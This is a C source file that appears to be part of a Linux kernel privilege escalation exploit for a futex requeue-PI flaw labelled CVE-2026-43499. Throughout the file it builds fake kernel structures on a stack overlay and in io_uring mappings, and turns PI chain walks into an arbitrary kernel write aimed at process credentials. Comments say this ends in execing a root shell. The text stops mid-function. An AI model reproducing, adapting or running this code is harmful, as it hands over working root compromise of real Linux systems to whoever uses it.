#include "common.h"
#include "runtime_struct_offsets.h"
#include <time.h>
static double fops_elapsed_ms(struct timespec *ref) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - ref->tv_sec) * 1000.0 + (now.tv_nsec - ref->tv_nsec) / 1e6;
}
extern int pselect_custom_write;

#define PSELECT_CFI_ROUTE_ATTEMPTS 8
#define PSELECT_EXPECTED_READY 9

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  /* With the write-plan engine active the consumer needs some head start
   * delay so the overlay sendmsg has landed on the waiter's kernel stack
   * before the first sched_setattr fires. */
  int default_delay = pselect_custom_write_enabled() ? 50000 : -1;
  int override = env_int_range("PSELECT_ROUTE_DELAY_USEC",
                               default_delay, -1, 1000000);
  if (override >= 0) {
    return override;
  }

  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

/* ===== repeatable write-plan engine =====
 * Each consumer sched_setattr runs one synchronous ghost chain walk. Plan 0
 * is the payload write (pselect_custom_target/value, already baked into
 * W0.pi_tree_entry on the spray page). After each walk the consumer applies
 * the next plan directly through the io_uring SQE mmap:
 *   - W0.pi_tree_entry.rb_right / rb_left
 *   - fake_lock->waiters.rb_leftmost = &W0.tree_entry so the next walk's
 *     prerequeue_top_waiter is W0 again (walk N's enqueue otherwise makes
 *     the stack waiter the leftmost)
 *   - W0.pi_tree_entry.__rb_parent_color LAST: after a walk the kernel
 *     RB_CLEAR_NODE'd it, so an interleaved walk harmlessly skips the
 *     erase until the final store commits a consistent plan. */
struct ghost_write_plan {
  uintptr_t pc;
  uintptr_t rb_right;
};
static struct ghost_write_plan g_write_plans[GHOST_MAX_PLANS];
int g_write_plan_count = 1;
int g_write_plans_active = 0; /* nonzero once plans[1..] exist */

void ghost_reset_plans(void) {
  g_write_plan_count = 1;
  g_write_plans_active = 0;
  memset(g_write_plans, 0, sizeof(g_write_plans));
}

/* target/value follow the same semantics as the payload write:
 * pc = (target-8)|1, rb_right = value. */
void ghost_push_plan(uintptr_t target, uintptr_t value) {
  if (g_write_plan_count >= GHOST_MAX_PLANS) return;
  struct ghost_write_plan *pl = &g_write_plans[g_write_plan_count++];
  pl->pc = (target - 8) | 1;
  pl->rb_right = value;
  g_write_plans_active = 1;
}

int ghost_plan_count(void) {
  return g_write_plan_count;
}

/* Called by the consumer thread after walk idx (0-based) completed.
 * The real page (whichever ring reclaimed the mm slab) is unknown until
 * after the first walk, so write the plan into EVERY SQE mapping - only
 * the mapping that backs the mm page is live for the kernel. */
extern uintptr_t g_consumer_task;
void ghost_apply_next_plan(int completed_walks) {
  int next = completed_walks + 1;
  if (!g_write_plans_active || next >= g_write_plan_count) return;
  if (uring_count == 0) return;
  struct ghost_write_plan *pl = &g_write_plans[next];
  uintptr_t pc = pl->pc;
  /* In cred mode, walk 1 targets the CONSUMER thread's cred (the consumer
   * can make syscalls post-walk, unlike the main thread). Override the
   * plan's target if the consumer leaked its own task. */
  if (write_mode_is_cred(pselect_custom_write) && g_consumer_task) {
    pc = (g_consumer_task + TASK15_CRED_OFF - 8) | 1;
    char m[96];
    int n = snprintf(m, sizeof(m), "[PLAN] retarget walk 1 -> consumer cred %016lx\n",
                     (unsigned long)(g_consumer_task + TASK15_CRED_OFF));
    write(1, m, n);
  }
  for (int m = 0; m < uring_count && m < URING_MAX; m++) {
    size_t mapsz = uring_mapsz[m] ? uring_mapsz[m] : MM_SLAB_SIZE;
    if (mapsz < MM_SLAB_SIZE)
      continue;
    size_t nblocks = mapsz / MM_SLAB_SIZE;
    for (size_t blk = 0; blk < nblocks; blk++) {
      uint8_t *page = (uint8_t *)uring_maps[m] + blk * MM_SLAB_SIZE;
      /* Re-arm pi_tree_entry for the write primitive */
      put64(page, W0_OFF + 0x18, pc);            /* pi_tree_entry.pc = new target */
      put64(page, W0_OFF + 0x20, pl->rb_right);  /* pi_tree_entry.rb_right = value */
      put64(page, W0_OFF + 0x28, 0);             /* pi_tree_entry.rb_left = NULL */
      /* Re-arm tree_entry (lock->waiters tree node) */
      put64(page, W0_OFF + 0x00, 0);             /* tree_entry.pc = black root */
      put64(page, W0_OFF + 0x08, 0);             /* tree_entry.rb_right = NULL */
      put64(page, W0_OFF + 0x10, 0);             /* tree_entry.rb_left = NULL */
      /* Re-arm lock->waiters tree roots */
      put64(page, LOCK_OFF + 0x08, fake_w0);     /* lock->waiters.rb_root = W0.tree_entry */
      put64(page, LOCK_OFF + 0x10, fake_w0);     /* lock->waiters.rb_leftmost = W0 */
      /* Re-arm lock->owner = fake_task|1. The quiesce between overlay
       * rounds zeroes it; without the owner the next walk's [9] check
       * (`if (!rt_mutex_owner(lock)) return 0`) ends the chain cleanly
       * BEFORE the [10]-[11] owner walk -- the erase never fires (observed:
       * [WALKCHK 0] NOT FOUND, dur=69us, no crash). */
      put64(page, LOCK_OFF + 0x18, fake_task | 1);
      /* Re-arm fake_task->pi_waiters: walk 0's enqueue_pi inserted the stack
       * waiter, so pi_waiters now points to kernel stack data. Reset it so
       * walk 1's dequeue_pi erases W0 (our controlled node), not the stack waiter. */
      put64(page, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, fake_w0 + 0x18);
      put64(page, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8, fake_w0 + 0x18);
      /* W0.prio must be WORSE than every rung so S always displaces W0
       * as the top waiter, triggering the owner-update (= our write). */
      put32(page, W0_OFF + 0x44, 139);
      /* Reset W0.task to fake_task (walk 0 might have changed it) */
      put64(page, W0_OFF + 0x30, fake_task);
    }
  }
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int shift = env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT, -14, 14);
  int global_word = shift + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  (void)write_fd;

  int dummy_pipe[2];
  pipe(dummy_pipe);
  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    close(dummy_pipe[0]); close(dummy_pipe[1]);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(dummy_pipe[0], fd);
    }
  }
  close(dummy_pipe[0]);
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  if (env_flag("HYBRID", 1)) {
    int wps = pselect_words_per_set();
    int task_word = env_int_range("TASK_WORD", 14, 0, wps * 3 - 1);
    pselect_put_global_word(in, out, ex, wps, task_word, fake_task);
    pr_info("HYBRID task_only word=%d=%016zx wps=%d\n",
            task_word, fake_task, wps);
    return;
  }
  if (env_flag("PSELECT_SIMPLE_LAYOUT", 0)) {
    fdset_put_word(in, 0, fake_w0);
    fdset_put_word(in, 3, 0);
    fdset_put_word(ex, 0,
                   pselect_custom_write_enabled() ? fake_task :
                   text_addr(INIT_TASK));
    fdset_put_word(ex, 1, fake_lock);
    fdset_put_word(ex, 2, 3);
    fdset_put_word(ex, 3, 0);
    return;
  }

  int compact = active_offsets && active_offsets->waiter_compact;

  int words_per_set = pselect_words_per_set();
  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  };

  struct pselect_waiter_word words_compact[] = {
    {2, 0, "tree_left"},
    {3, 0, "pi_parent"},
    {4, 0, "pi_right"},
    {5, 0, "pi_left"},
    {6, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK), "task"},
    {7, fake_lock, "lock"},
    {8, 0, "prio"},
    {9, 0, "deadline"},
  };

  struct pselect_waiter_word words[] = {
    {2, 0, "tree_pc"},
    {3, 0, "tree_right"},
    {4, 0, "tree_left"},
    {5, 1, "tree_prio"},
    {6, 0, "tree_deadline"},
    {7, 0, "pi_parent"},
    {8, 0, "pi_right"},
    {9, 0, "pi_left"},
    {10, 1, "pi_prio"},
    {11, 0, "pi_deadline"},
    {12, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
     "task"},
    {13, fake_lock, "lock"},
    {14, 3, "wake_state"},
  };

  struct pselect_waiter_word *active_words = compact ? words_compact : words;
  size_t active_count = compact
      ? sizeof(words_compact) / sizeof(words_compact[0])
      : sizeof(words) / sizeof(words[0]);

  for (size_t i = 0; i < active_count; i++) {
    struct pselect_waiter_word *w = &active_words[i];
    pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

/* ---- WALK POLLER (identity diagnostic) ----
 * Samples every io_uring mapping's +0xE80 (the fake_lock->wait_lock word)
 * plus the W0.pi_tree_entry.pc at W0_OFF+0x18, from just before the first
 * sched_setattr until the readback. The walk's [5] trylock is a qspinlock
 * cmpxchg on that word: a SUCCESSFUL walk holds it (value becomes 1) and
 * the unlock restores 0; a spinning walk means the KERNEL sees a nonzero
 * value there for the whole SO_SNDTIMEO. If our mappings never show any
 * transient nonzero/changed value while the walk spins for 3 s, the
 * kernel's linear page at the leaked mm address is NOT any of our
 * mappings (the reclaim lost the page). */
static atomic_int g_poller_stop;
static pthread_t g_poller_tid;

static void *walk_poller(void *arg __attribute__((unused))) {
  static uint64_t last_lock[64];
  static uint64_t last_pc[64];
  int n = uring_count;
  if (n > 64) n = 64;
  for (int m = 0; m < n; m++) {
    last_lock[m] = *(volatile uint64_t *)((uint8_t *)uring_maps[m] + LOCK_OFF);
    last_pc[m] = *(volatile uint64_t *)((uint8_t *)uring_maps[m] + W0_OFF + 0x18);
  }
  while (!atomic_load(&g_poller_stop)) {
    for (int m = 0; m < n; m++) {
      volatile uint8_t *pg = (volatile uint8_t *)uring_maps[m];
      uint64_t l = *(volatile uint64_t *)(pg + LOCK_OFF);
      if (l != last_lock[m]) {
        pr_info("[POLL] ring %d lock word +0x%X: %016llx -> %016llx\n",
                m, LOCK_OFF, (unsigned long long)last_lock[m], (unsigned long long)l);
        last_lock[m] = l;
      }
      uint64_t pc = *(volatile uint64_t *)(pg + W0_OFF + 0x18);
      if (pc != last_pc[m]) {
        pr_info("[POLL] ring %d W0.pi_tree.pc +0x%04zx: %016llx -> %016llx\n",
                m, (size_t)W0_OFF + 0x18,
                (unsigned long long)last_pc[m], (unsigned long long)pc);
        last_pc[m] = pc;
      }
    }
    for (volatile int i = 0; i < 200; i++)
      ;
  }
  return NULL;
}

static void walk_poller_start(void) {
  if (!env_flag("WALK_POLL", 0) || uring_count == 0) return;
  /* No pthread_create from the SIGUSR1 handler context (the in-handler
   * route may call this). */
  if (atomic_load(&route_in_handler)) return;
  atomic_store(&g_poller_stop, 0);
  if (pthread_create(&g_poller_tid, NULL, walk_poller, NULL) == 0)
    pr_info("[POLL] walk poller started (%d mappings)\n", uring_count);
}

static void walk_poller_stop(void) {
  if (!env_flag("WALK_POLL", 0) || uring_count == 0) return;
  atomic_store(&g_poller_stop, 1);
  pthread_join(g_poller_tid, NULL);
  pr_info("[POLL] walk poller stopped\n");
}

/* ---- FULL READBACK DIFF ----
 * After the route, compare every mapping against the expected payload
 * (skb_buf + the GHOST_TEST=1 per-mapping pi_tree patch) and print every
 * differing qword. This shows EXACTLY what the kernel wrote where, with
 * no scan heuristics in the way. */
static void readback_full_diff(void) {
  if (!env_flag("READBACK_DIFF", 0) || uring_count == 0) return;
  int ghost_test = env_int_range("GHOST_TEST", 0, 0, 1);
  int shown = 0;
  for (int m = 0; m < uring_count && shown < 256; m++) {
    uint8_t *pg = (uint8_t *)uring_maps[m];
    int diffs = 0;
    for (size_t off = 0; off + 8 <= MM_SLAB_SIZE; off += 8) {
      uint64_t want = (off < SKB_SEND_SIZE) ?
          *(uint64_t *)(skb_buf + off) : 0;
      if (ghost_test == 1 && off == W0_OFF + 0x18)
        want = page_base + W0_OFF + 0x18; /* the RB_EMPTY patch */
      uint64_t got = *(uint64_t *)(pg + off);
      if (got != want) {
        if (diffs < 12)
          pr_info("[DIFF] ring %d +%04zx: want %016llx got %016llx\n",
                  m, off, (unsigned long long)want, (unsigned long long)got);
        diffs++;
        shown++;
      }
    }
    if (diffs)
      pr_info("[DIFF] ring %d: %d qwords differ\n", m, diffs);
  }
}

/* ---- WALK-BEFORE-CLEANUP RESTRUCTURE ---------------------------------
 * The SIGUSR1 handler below is the core of the fix for the MCS spinlock
 * wedge. Sequence (cred mode and every other pselect_custom_write mode):
 *
 *   1. waiter: FUTEX_WAIT_REQUEUE_PI(f_wait, abs timeout, f_pi_target)
 *      - asleep on the f_wait hash bucket.
 *   2. main:   FUTEX_CMP_REQUEUE_PI(f_wait, 1, f_pi_target) -> -EDEADLK.
 *      rt_mutex_start_proxy_lock() -> task_blocks_on_rt_mutex() arms
 *      waiter->pi_blocked_on = &rt_waiter (the waiter task's ON-STACK
 *      rt_mutex_waiter, ->lock = the real pi_state mutex) and the
 *      deadlock walk returns -EDEADLK; remove_waiter() then clears
 *      CURRENT's (main's) pi_blocked_on instead of the waiter task's --
 *      CVE-2026-43499: the waiter's pi_blocked_on stays dangling. The
 *      requeue state goes Q_REQUEUE_PI_NONE: the waiter is NOT woken.
 *   3. main:   tgkill(SIGUSR1 -> waiter). The futex returns
 *      -ERESTARTNOINTR (kernel-internal restart), the do_futex frame
 *      unwinds, the signal handler runs on the waiter in USERSPACE.
 *   4. handler: do_pselect_fake_lock_route() -> the SEQPACKET overlay
 *      sendmsg. Every syscall re-enters the kernel at the SAME stack
 *      depth (pt_regs is at the top of the kernel stack for every el0
 *      syscall), so the overlay sockaddr/iovstack land at exactly the
 *      dangling rt_waiter's address: waiter->lock = fake_lock (spray
 *      page), waiter->task = fake_task, waiter->prio = CAL_PRIO.
 *   5. consumer: sched_setattr(waiter_tid, nice ladder) -> the PI chain
 *      walk fires against the overlay while the handler is blocked in
 *      sendmsg -> the rb_erase write primitive -> task->cred/real_cred =
 *      fake_cred; then the consumer quiesces the page (spinlocks, tree
 *      roots, uid repair) and sets consumer_walks_done.
 *   6. main:    the getuid() poll observes the cred swap, waits for
 *      consumer_walks_done, and execs the root shell. Nothing is left
 *      spinning on a page qspinlock at that point (all walks returned
 *      before the main thread could even observe the cred change).
 *   7. handler: sendmsg times out (SO_SNDTIMEO 3s) or the exec kills the
 *      waiter thread mid-sleep (sk_stream_wait_memory is interruptible,
 *      so de_thread() can reap it). In the failure path the handler
 *      returns, the futex syscall RESTARTS (pc rewound by the kernel at
 *      step 3), immediately times out against its original absolute
 *      deadline, and the ETIMEDOUT cleanup path
 *      (handle_early_requeue_pi_wakeup: spin_lock(&hb->lock) +
 *      plist_del) runs -- but now AFTER all walks completed and the page
 *      was quiesced, and it never touches any rt mutex or page spinlock
 *      at all. The MCS wedge is structurally eliminated: the cleanup can
 *      no longer interleave with an in-flight walk.
 *
 * GHOST_SIGNAL_ROUTE=0 selects the legacy flow (route called inline by
 * the waiter AFTER the futex returned ETIMEDOUT) for A/B testing. */
int ghost_signal_route_enabled(void) {
  static int cached = -1;
  if (cached < 0)
    cached = env_flag("GHOST_SIGNAL_ROUTE", 1);
  return cached;
}

void ghost_usr1_handler(int sig) {
  (void)sig;
  /* Async-signal context on the waiter thread: use raw write() only. */
  if (!ghost_signal_route_enabled())
    return; /* legacy flow: the waiter runs the route itself */
  if (atomic_load(&waiter_futex_returned)) {
    /* Signal arrived after the futex finally returned (main was delayed
     * past the 1s timeout): the waiter's inline route owns the flow. */
    static const char late[] =
        "[TRIG] waiter SIGUSR1 handler: futex already returned, skipping in-handler route\n";
    write(1, late, sizeof(late) - 1);
    return;
  }
  if (!atomic_load(&ghost_bug_armed)) {
    /* Stray/early signal: the CMP_REQUEUE_PI has not armed the dangling
     * pi_blocked_on yet -- the walk would be a harmless no-op, but skip
     * the route to keep the choreography deterministic. */
    static const char early[] =
        "[TRIG] waiter SIGUSR1 handler: bug not armed, skipping in-handler route\n";
    write(1, early, sizeof(early) - 1);
    return;
  }
  atomic_store(&route_in_handler, 1);
  {
    static const char go[] =
        "[TRIG] waiter SIGUSR1 handler: overlay route start (futex pending restart)\n";
    write(1, go, sizeof(go) - 1);
  }
  do_pselect_fake_lock_route();
  /* On return: the walks fired against the overlay and the page is
   * quiesced. Returning lets the kernel restart FUTEX_WAIT_REQUEUE_PI;
   * it times out immediately (absolute deadline long past) and the
   * cleanup path runs over clean page state. */
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int calls = 0;
  int success = 0;
  int route_verified = 0;

  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      /* Same-page overlay retry (cred mode): the first round PROVED the
       * reclaimed page is live (an erase landed on it) but later planned
       * walks could not fire -- walk N's [7] waiter_update_prio writes the
       * CFS-clamped prio 120 into the overlay waiter, so every subsequent
       * sched_setattr walk aborts at rt_mutex_adjust_pi's equal-prio gate
       * (empirically: [WALKCHK 1] NOT FOUND, dur=80us). A FRESH sendmsg
       * overlay re-writes waiter->prio = CAL_PRIO (1) and the consumer's
       * monotonic nice ladder (7->14->19) supplies the real priority
       * change, so the pending plan's erase fires on the SAME page. No
       * re-spray: the page is verified live; re-spraying would only
       * re-roll the reclaim dice. */
      int retry_same_page =
          write_mode_is_cred(pselect_custom_write) && page_base &&
          atomic_load(&consumer_erase_hits) > 0 &&
          atomic_load(&consumer_erase_hits) < g_write_plan_count &&
          consumer_nice_headroom();
      if (!retry_same_page) {
        page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
        if (!page_base || !fake_lock || !fake_fops) {
          cfi_last_step = 34;
          cfi_last_errno = errno;
          break;
        }
      } else {
        char rm[128];
        int rn = snprintf(rm, sizeof(rm),
            "[ROUTE] attempt=%d same-page overlay retry (erases=%d/%d, nice=%d)\n",
            route_attempt, atomic_load(&consumer_erase_hits),
            g_write_plan_count, g_consumer_nice);
        write(1, rm, rn);
      }
    }

    /* SEQPACKET sendmsg overlay: unix_seqpacket_sendmsg discards msg_name
     * AFTER move_addr_to_kernel copies all 128 bytes to the kernel stack.
     * Sockaddr byte mapping (from fingerprint scan on this PGO kernel):
     *   byte 0:  waiter.pi_tree_entry.rb_left  (@0x28)
     *   byte 8:  waiter.task                    (@0x30)
     *   byte 16: waiter.lock                    (@0x38)
     *   byte 24: waiter.wake_state              (@0x40, 4 bytes)
     *   byte 28: waiter.prio                    (@0x44, 4 bytes)
     *   byte 32: waiter.deadline                (@0x48)
     *   byte 40: waiter.ww_ctx                  (@0x50)
     */
    int seqsv[2];
    if (socketpair(AF_UNIX, SOCK_SEQPACKET, 0, seqsv) < 0) {
      pr_error("socketpair SEQPACKET errno=%d\n", errno);
      cfi_last_step = 36;
      cfi_last_errno = errno;
      break;
    }

    uint8_t overlay[128];
    memset(overlay, 0, sizeof(overlay));
    /* task = fake_task (on sprayed page).
     * CAL_TASK=init overrides it with init_task's linear alias for the
     * identity diagnostic walk: a walk on a RUNNING task's pointer makes
     * every downstream step a provable no-op (try_to_wake_up early-returns
     * on __state=0; rt_mutex_setprio takes the prio==p->prio bail), so the
     * ONLY effect is the [7] enqueue's writes into the CAL_LOCK_REL lock
     * copy - which the readback diff then shows (or not) in OUR mapping. */
    uint64_t task_val = fake_task;
    {
      char *cal_task = getenv("CAL_TASK");
      if (cal_task && strcmp(cal_task, "init") == 0)
        task_val = data_addr(INIT_TASK);
      else if (cal_task)
        task_val = strtoull(cal_task, NULL, 0);
    }
    memcpy(overlay + 8, &task_val, 8);
    /* lock = fake_lock (on sprayed page) — or CAL_LOCK override for
     * mapping experiments: a low-phys linear-map address like
     * 0xffffff8000000800 (phys 0x800, RAM, readable, zero) lets the walk
     * proceed with lock content = 0 (trylock succeeds, owner NULL ends
     * the walk safely at [9] with only a harmless low-phys write). */
    uint64_t lock_val = fake_lock;
    {
      /* CAL_LOCK_REL: page-relative lock override (identity diagnostic).
      * Points the walk at a second, payload-controlled fake_lock layout
      * copy inside the SAME leaked page (see CAL_LOCK_COPY_OFF). */
      char *cal_lock_rel = getenv("CAL_LOCK_REL");
      if (cal_lock_rel) {
        lock_val = page_base + strtoull(cal_lock_rel, NULL, 0);
      } else {
        char *cal_lock = getenv("CAL_LOCK");
        if (cal_lock) lock_val = strtoull(cal_lock, NULL, 0);
      }
    }
    memcpy(overlay + 16, &lock_val, 8);
    /* wake_state = TASK_NORMAL = 3 */
    uint32_t ws = 3;
    memcpy(overlay + 24, &ws, 4);
    /* prio = 1 (high RT prio, triggers PI boost) */
    int32_t prio = env_int_range("CAL_PRIO", 1, 0, 140);
    memcpy(overlay + 28, &prio, 4);

    struct sockaddr_storage overlay_addr;
    memcpy(&overlay_addr, overlay, 128);

    /* Use 8 iovecs to also fill iovstack on the kernel stack.
     * iovstack is in the same ___sys_sendmsg frame as sockaddr_storage.
     * iov[0] has real data (valid iov_base + small iov_len).
     * iov[1..7] have iov_base=dummy (valid userspace), iov_len=fingerprint or waiter values.
     * The kernel copies ALL 8 iovecs to iovstack BEFORE validating data. */
    static char sdata[64];
    memset(sdata, 0x41, sizeof(sdata));

    void *dummy_page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (dummy_page == MAP_FAILED) dummy_page = sdata;
    else memset(dummy_page, 0, 4096);

    struct iovec siov[8];
    siov[0].iov_base = sdata;
    siov[0].iov_len = sizeof(sdata);
    for (int i = 1; i < 8; i++) {
      siov[i].iov_base = dummy_page;
      siov[i].iov_len = 0;
    }
    /* iovstack overlay (mapping confirmed by fingerprint scan):
     *   iovstack byte  88 = iov[5].iov_len = waiter+0x00 = tree_entry.__rb_parent_color
     *   iovstack byte  96 = iov[6].iov_base = waiter+0x08 = tree_entry.rb_right
     *   iovstack byte 104 = iov[6].iov_len  = waiter+0x10 = tree_entry.rb_left
     *   iovstack byte 112 = iov[7].iov_base = waiter+0x18 = pi_tree_entry.__rb_parent_color
     *   iovstack byte 120 = iov[7].iov_len  = waiter+0x20 = pi_tree_entry.rb_right
     *   sockaddr byte     0                = waiter+0x28 = pi_tree_entry.rb_left
     *
     * All-zero iovs pass access_ok, so the overlay sendmsg SUCCEEDS and
     * blocks in sk_stream_wait_memory with the frame (and iovstack) alive.
     *
     * tree_entry = {pc=0, right=0, left=0}: the [7] dequeue of the stack
     * waiter takes Case 1a with parent=NULL, which sets
     * fake_lock->waiters.rb_node = 0 (child). The following enqueue then
     * starts from an EMPTY root, making the stack waiter the new
     * rb_leftmost => the [11] TRUE branch fires and dequeues W0 from
     * fake_task->pi_waiters, running the rb_erase write primitive on
     * W0.pi_tree_entry (spray page, fully controlled).
     *
     * pi_tree_entry = {pc=0, right=0, left=0}: only erased if a later walk
     * has prerequeue_top_waiter == the stack waiter; with pc=0 that erase
     * writes NULL to fake_task->pi_waiters.rb_node (harmless). */
    siov[5].iov_len = 0;
    siov[6].iov_base = NULL;
    siov[6].iov_len = 0;
    siov[7].iov_base = NULL;
    siov[7].iov_len = 0;

    uint64_t write_target = pselect_custom_target;

    struct msghdr smsg;
    memset(&smsg, 0, sizeof(smsg));
    smsg.msg_name = &overlay_addr;
    smsg.msg_namelen = 128;
    smsg.msg_iov = siov;
    smsg.msg_iovlen = 8;

    /* Fill sender wmem so overlay sendmsg blocks */
    int sndbuf = 4096;
    setsockopt(seqsv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    char sfill[256];
    memset(sfill, 0x42, sizeof(sfill));
    for (int i = 0; i < 128; i++) {
      if (send(seqsv[0], sfill, sizeof(sfill), MSG_DONTWAIT) <= 0) break;
    }

    struct timeval snd_to = { .tv_sec = 3, .tv_usec = 0 };
    setsockopt(seqsv[0], SOL_SOCKET, SO_SNDTIMEO, &snd_to, sizeof(snd_to));

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);

    /* Diagnostic level (GHOST_TEST env):
     *   0 = full write (default)
     *   1 = [11] TRUE branch runs but W0.pi_tree is RB_EMPTY (erase skipped)
     * Level 1 exercises every never-before-taken path (the [7] erase
     * clearing rb_node, the empty-root enqueue, the [11] TRUE branch,
     * enqueue_pi and adjust_prio) with the W0.pi_tree rb_erase disabled.
     * Note: the [7] erase pc must stay 0 for a successful sendmsg - any
     * kernel address in iov[5].iov_len fails access_ok and the overlay
     * sendmsg would return instead of blocking. */
    int ghost_test = env_int_range("GHOST_TEST", 0, 0, 1);
    if (ghost_test == 1 && uring_count > 0) {
      for (int m = 0; m < uring_count; m++) {
        uint8_t *page = (uint8_t *)uring_maps[m];
        /* RB_EMPTY_NODE: rt_mutex_dequeue_pi returns without erasing */
        put64(page, W0_OFF + 0x18, page_base + W0_OFF + 0x18);
      }
      pr_info("GHOST_TEST=1: W0.pi_tree RB_EMPTY (erase will be skipped)\n");
    }
    if (uring_count > 0) {
      /* Pre-walk payload verification: dump the regions the chain walk
       * consumes so a payload-landing error is caught before firing. */
      uint8_t *page = (uint8_t *)uring_sqes;
      pr_info("  pre-walk page dump: page=%016zx\n", page_base);
      pr_info("    lock@0x%X: wl=%08x rb_node=%016llx rb_left=%016llx owner=%016llx\n",
              LOCK_OFF,
              *(uint32_t *)(page + LOCK_OFF),
              (unsigned long long)*(uint64_t *)(page + LOCK_OFF + 0x08),
              (unsigned long long)*(uint64_t *)(page + LOCK_OFF + 0x10),
              (unsigned long long)*(uint64_t *)(page + LOCK_OFF + 0x18));
      pr_info("    W0@0x%X: tree.pc=%016llx tree.r=%016llx tree.l=%016llx\n",
              W0_OFF,
              (unsigned long long)*(uint64_t *)(page + W0_OFF + 0x00),
              (unsigned long long)*(uint64_t *)(page + W0_OFF + 0x08),
              (unsigned long long)*(uint64_t *)(page + W0_OFF + 0x10));
      pr_info("    W0.pi_tree: pc=%016llx r=%016llx l=%016llx\n",
              (unsigned long long)*(uint64_t *)(page + W0_OFF + 0x18),
              (unsigned long long)*(uint64_t *)(page + W0_OFF + 0x20),
              (unsigned long long)*(uint64_t *)(page + W0_OFF + 0x28));
      pr_info("    W0.task/lock/prio: task=%016llx lock=%016llx wake=%08x prio=%08x\n",
              (unsigned long long)*(uint64_t *)(page + W0_OFF + 0x30),
              (unsigned long long)*(uint64_t *)(page + W0_OFF + 0x38),
              *(uint32_t *)(page + W0_OFF + 0x40),
              *(uint32_t *)(page + W0_OFF + 0x44));
      pr_info("    task.pi: waiters.root=%016llx left=%016llx pi_top=%016llx blocked=%016llx\n",
              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + 0x8F8),
              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + 0x900),
              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + 0x908),
              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + 0x910));
